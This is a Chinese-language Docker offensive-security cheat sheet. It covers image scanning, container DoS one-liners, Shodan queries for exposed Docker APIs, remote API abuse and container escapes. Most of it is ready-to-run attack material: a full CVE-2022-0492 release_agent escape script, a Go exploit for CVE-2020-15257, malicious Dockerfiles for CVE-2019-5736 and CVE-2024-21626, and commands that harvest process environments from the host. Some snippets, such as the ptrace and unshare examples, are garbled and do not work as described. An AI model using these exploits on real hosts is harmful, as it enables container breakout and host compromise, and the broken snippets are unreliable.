# Docker服务

1.镜像扫描

[Docker Scout](https://docs.docker.com/scout/)
```bash
git clone https://github.com/docker/scout-demo-service.git
cd scout-demo-service
docker login
docker build --push -t <ORG_NAME>/scout-demo:v1 .

docker scout enroll <ORG_NAME>
    Successfully enrolled organization <ORG_NAME> with Docker Scout Free
docker scout repo enable --org <ORG_NAME> <ORG_NAME>/scout-demo

docker scout cves --only-package express
```

Docker Scan
```Bash
docker scan hello-world

Testing hello-world...

Organization:      docker-desktop-test
Package manager:   linux
Project name:      docker-image|hello-world
Docker image:      hello-world
Licenses:          enabled

✓ Tested 0 dependencies for known issues, no vulnerable paths found.

Note that we do not currently have vulnerability data for your image.
```

[trivy](https://github.com/aquasecurity/trivy)
```Bash
trivy -q -f json <container_name>:<tag>
```

[snyk](https://docs.snyk.io/snyk-cli/getting-started-with-the-cli)
```Bash
snyk container test <image> --json-file-output=<output file> --severity-threshold=high
```

[clair-scanner](https://github.com/arminc/clair-scanner)
```Bash
clair-scanner -w example-alpine.yaml --ip YOUR_LOCAL_IP alpine:3.5
```

2.cgroups
```Bash
docker run -it -m 500M --kernel-memory 50M --cpu-shares 512 --blkio-weight 400 --name ubuntu1 ubuntu bash
```

获取容器的cgroup
```Bash
docker run -dt --rm [images-name] sleep 200
ps -ef | grep 200
ls -l /proc/<PID>/ns
```

3.容器DOS

CPU DOS
```Bash
# stress-ng
sudo apt-get install -y stress-ng && stress-ng --vm 1 --vm-bytes 1G --verify -t 5m

# While
docker run -d --name malicious-container -c 512 busybox sh -c 'while true; do :; done'
```

网络DOS
```Bash
nc -lvp 4444 >/dev/null & while true; do cat /dev/urandom | nc <target IP> 4444; done
```

## 滥用API

Shodan：
```Bash
port:2375 product:"docker"
```

启用API
```Bash
/usr/lib/systemd/system/docker.service:
ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock

systemctl daemon-reload
systemctl restart docker
```

```Bash
docker -H IP地址:端口 version  //查看Docker版本
docker -H IP地址:端口 images  //查看运行的镜像
docker -H IP地址:端口 exec -it 镜像ID /bin/bash  //远程访问容器

curl -X GET http://<远程主机IP>:2375/containers/json  //查看所有容器
curl -X GET http://<远程主机IP>:2375/images/json  //查看所有镜像
curl -X GET http://<远程主机IP>:2375/containers/<容器ID>/json  //查看特定容器的详细信息
curl -X GET http://<远程主机IP>:2375/images/<镜像ID>/json  //查看特定镜像的详细信息
```

使用Python脚本通过Docker API查看远程Docker靶机的容器和镜像信息
```python
import docker

client = docker.DockerClient(base_url='tcp://<远程主机IP>:2375')

# 查看所有容器
containers = client.containers.list(all=True)
for container in containers:
    print(container.id, container.name)

# 查看所有镜像
images = client.images.list()
for image in images:
    print(image.id, image.tags)
```

## 容器逃逸

### 特权容器逃逸

+ --cap-add=ALL
+ --security-opt apparmor=unconfined
+ --security-opt seccomp=unconfined
+ --security-opt label:disable
+ --pid=host
+ --userns=host
+ --uts=host
+ --cgroupns=host
+ mount /dev

1.hostpid

Docker启动选项
```bash
docker run --rm -u 0 -it --pid=host --privileged [镜像] /bin/bash
```

容器内执行
```Bash
nsenter --target 1 --mount --uts --ipc --net --pid – bash
```

2.挂载宿主机文件

Docker启动选项
```Bash
docker run --rm -u 0 -it --privileged [镜像] /bin/bash
docker run --rm -u 0 -it --device=/dev/sda1 [镜像] /bin/bash
```

容器内执行
```Bash
mkdir -p /mnt/docker
mount /dev/sda1 /mnt/docker
cd /mnd/docker
```

3.hostPath

容器内执行
```Bash
echo 1 > /proc/sysrq-trigger  //检查是否可写入
cat /proc/cmdline  //获取root UID
findfs UUID=UUID值  //查看文件系统
mkdir /mnt-docker
mount /dev/sda1 /mnt-docker
debugfs /dev/sda1
```

4.CVE-2022-0492

[UNIT42](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

[HTB](https://www.hackthebox.com/blog/cve-2022-04920-carpe-diem-explained)

枚举PID触发release_agent
```Bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=168607
CGROUP_NAME="x"
CGROUP_MOUNT="/docker"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# 运行一个长时间进程，以便搜索
sleep 10000 &

# 在宿主机上执行的有效负载
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

ps -eaf > \${OUTPATH} 2>&1  //在宿主机上运行的命令
__EOF__

chmod a+x ${PAYLOAD_PATH}

# cgroup挂载
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# 枚举宿主机PID
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # 将release_agent路径设置为枚举到的PID
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # 触发release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# 捕获输出
sleep 1
echo "Output:"
cat ${OUTPUT_PATH}
```

### Docker挂载

Docker启动选项
```Bash
docker run --rm -it -v /:/host [镜像名] /bin/bash
```

容器内执行
```Bash
cd /host
ls
```

### 宿主机PID

Docker启动选项
```Bash
docker run --rm -it --pid=host [镜像名] /bin/bash
```

容器内执行
```Bash
ps auxn
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > file.txt
cat /proc/进程ID/fd/文件描述符
```

如果以某种方式对容器外部的进程拥有特权访问，则可以运行以下命令运行具有与该进程相同 ns 限制的shell
```Bash
nsenter --target <pid> --all
nsenter --target <pid> --mount --net --pid --cgroup
```

### 宿主机网络

Docker启动选项
```Bash
docker run --rm -it --network=host [镜像名] /bin/bash
```

容器内执行
```Bash
apt-get update
apt install tcpdump
tcpdump -i 网络接口
```

### 宿主机IPC

Docker启动选项
```Bash
docker run --rm -it --ipc=host [镜像名] /bin/bash
```

容器内执行
```Bash
ipcs -a
```

获取容器内存布局
```c
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    int fd = open("/proc/self/maps", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    char *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    printf("%s\n", map);
    munmap(map, 4096);
    close(fd);
    return 0;
}
```

ptrace附加主机进程
```c
#include <sys/ptrace.h>
#include <unistd.h>

int main() {
    pid_t pid = getpid();
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    waitpid(pid, NULL, 0);

    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
```

### unshare

容器内执行
```Bash
unshare -f /proc/self/fd
mknod /proc/self/fd/1
cat /proc/self/fd/1 > /etc/passwd
chmod 777 /etc/passwd
chroot /挂载目录 /bin/bash
```

### Docker守护进程配置错误

利用守护进程创建容器
```python
import docker
client = docker.DockerClient(base_url='tcp://宿主机IP:2375')
client.containers.run('alpine:latest', 'touch /tmp/escape_success')
```

docker.sock挂载到容器内部
```Bash
docker run -it -v /var/run/docker.sock:/var/run/docker.sock [镜像名] /bin/bash

容器内执行
docker -H unix:///var/run/docker.sock [命令]
```

### 容器运行时

1.CVE-2020-15257

containerd-shim API
```Bash
service Shim {
	// State returns shim and task state information.
	rpc State(StateRequest) returns (StateResponse);
	rpc Create(CreateTaskRequest) returns (CreateTaskResponse);
	rpc Start(StartRequest) returns (StartResponse);
	rpc Delete(google.protobuf.Empty) returns (DeleteResponse);
	rpc DeleteProcess(DeleteProcessRequest) returns (DeleteResponse);
	rpc ListPids(ListPidsRequest) returns (ListPidsResponse);
	rpc Pause(google.protobuf.Empty) returns (google.protobuf.Empty);
	rpc Resume(google.protobuf.Empty) returns (google.protobuf.Empty);
	rpc Checkpoint(CheckpointTaskRequest) returns (google.protobuf.Empty);
	rpc Kill(KillRequest) returns (google.protobuf.Empty);
	rpc Exec(ExecProcessRequest) returns (google.protobuf.Empty);
	rpc ResizePty(ResizePtyRequest) returns (google.protobuf.Empty);
	rpc CloseIO(CloseIORequest) returns (google.protobuf.Empty);
	// ShimInfo returns information about the shim.
	rpc ShimInfo(google.protobuf.Empty) returns (ShimInfoResponse);
	rpc Update(UpdateTaskRequest) returns (google.protobuf.Empty);
	rpc Wait(WaitRequest) returns (WaitResponse);
}
```

exp:

[summershrimp](https://github.com/summershrimp/exploits-open/tree/9f2e0a28ffcf04ac81ce9113b2f8c451c36fe129/CVE-2020-15257)

```go
package main

import (
    "context"
    "errors"
    "io/ioutil"
    "log"
    "net"
    "regexp"
    "strings"

    "github.com/containerd/ttrpc"
    shimapi "github.com/containerd/containerd/runtime/v1/shim/v1"
)

func getDockerID() (string,  error) {
    re, err := regexp.Compile("pids:/docker/.*")
    if err != nil {
        return "", err
    }
    data, err := ioutil.ReadFile("/proc/self/cgroup")
    matches := re.FindAll(data, -1)
    if matches == nil {
        return "", errors.New("Cannot find docker id")
    }

    tmp_docker_id := matches[0]
    docker_id := string(tmp_docker_id[13 : len(tmp_docker_id)])
    return docker_id, nil

}

func getMergedPath() (string,  error) {
    re, err := regexp.Compile("workdir=.*")
    if err != nil {
        return "", err
    }
    data, err := ioutil.ReadFile("/etc/mtab")
    matches := re.FindAll(data, -1)
    if matches == nil {
        return "", errors.New("Cannot find merged path")
    }

    tmp_path := matches[0]
    path := string(tmp_path[8 : len(tmp_path)-8])
    merged := path + "merged/"
    return merged, nil

}

func getShimSockets() ([][]byte, error) {
    re, err := regexp.Compile("@/containerd-shim/.*\\.sock")
    if err != nil {
        return nil, err
    }
    data, err := ioutil.ReadFile("/proc/net/unix")
    matches := re.FindAll(data, -1)
    if matches == nil {
        return nil, errors.New("Cannot find vulnerable socket")
    }

    return matches, nil
}


func exp(sock string, docker_id string, payload_path string) bool {
    sock = strings.Replace(sock, "@", "", -1)
    conn, err := net.Dial("unix", "\x00"+sock)
    if err != nil {
        log.Println(err)
        return false
    }

    client := ttrpc.NewClient(conn)
    shimClient := shimapi.NewShimClient(client)

    ctx := context.Background()
    md := ttrpc.MD{}
    md.Set("containerd-namespace-ttrpc", "notmoby")
    ctx = ttrpc.WithMetadata(ctx, md)

    /* // poc get shim pid
    info, err := shimClient.ShimInfo(ctx, &types.Empty{})
    if err != nil {
        log.Println("rpc error:", err)
        return false
    }

    log.Println("shim pid:", info.ShimPid)
    */

    r, err := shimClient.Create(ctx, &shimapi.CreateTaskRequest{
        ID: docker_id,
        Bundle: "/run/containerd/io.containerd.runtime.v1.linux/moby/"+docker_id+"/config.json",
        Runtime : "io.containerd.runtime.v1.linux",
        Stdin:  "anything",
        //Stdout: "binary:///bin/sh?-c=cat%20/proc/self/status%20>/tmp/foobar",
        Stdout: "binary:///bin/sh?-c="+payload_path+"nc",
        Stderr: "anything",
        Terminal : false,
        Checkpoint : "anything",
    })

    if err != nil {
            log.Println(err)
            return false
    }

    log.Println(r)
    return true
}

func main() {
    matchset := make(map[string]bool)
    socks, err := getShimSockets()

    docker_id, err := getDockerID()
    log.Println("find docker id:", docker_id)

    merged_path, err := getMergedPath()
    log.Println("find path:", merged_path)

    if err != nil {
        log.Fatalln(err)
    }

    for _, b := range socks {
        sockname := string(b)
        if _, ok := matchset[sockname]; ok {
            continue
        }
        log.Println("try socket:", sockname)
        matchset[sockname] = true
        if exp(sockname, docker_id, merged_path) {
            break
        }
    }

    return
}
```

2.CVE-2019-5736

exp:

[UNIT42](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)

[twistlock](https://github.com/twistlock/RunC-CVE-2019-5736/tree/master/exec_POC)

[Frichetten](https://github.com/Frichetten/CVE-2019-5736-PoC)

恶意Docker镜像
```Bash
FROM ubuntu:18.04

# 获取libseccomp源代码和所需依赖
RUN set -e -x ;\
    sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\
    apt -y update ;\
    apt-get -y install build-essential ;\
    cd /root ;\
    apt-get -y build-dep libseccomp ;\
    apt-get source libseccomp

# 将run_at_link函数附加到libseccomp-2.3.1/src/api.c文件并构建
ADD run_at_link.c /root/run_at_link.c
RUN set -e -x ;\
    cd /root/libseccomp-* ;\
    cat /root/run_at_link.c >> src/api.c ;\
    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
    dpkg -i /root/*.deb

# 添加overwrite_runc.c文件并编译
ADD overwrite_runc.c /root/overwrite_runc.c
RUN set -e -x ;\
    cd /root ;\
    gcc overwrite_runc.c -o /overwrite_runc

# 添加new_runc文件以在执行替换
ADD new_runc /root/new_runc

# 创建符号链接并设置为入口点
RUN set -e -x ;\
    ln -s /proc/self/exe /entrypoint
ENTRYPOINT [ "/entrypoint" ]
```

3.CVE-2024-21626

构建恶意镜像
```Bash
FROM ubuntu:22.04
RUN ls -al ./
WORKDIR /proc/self/fd/8
```

Other

CVE-2022-0492

## Docker提权
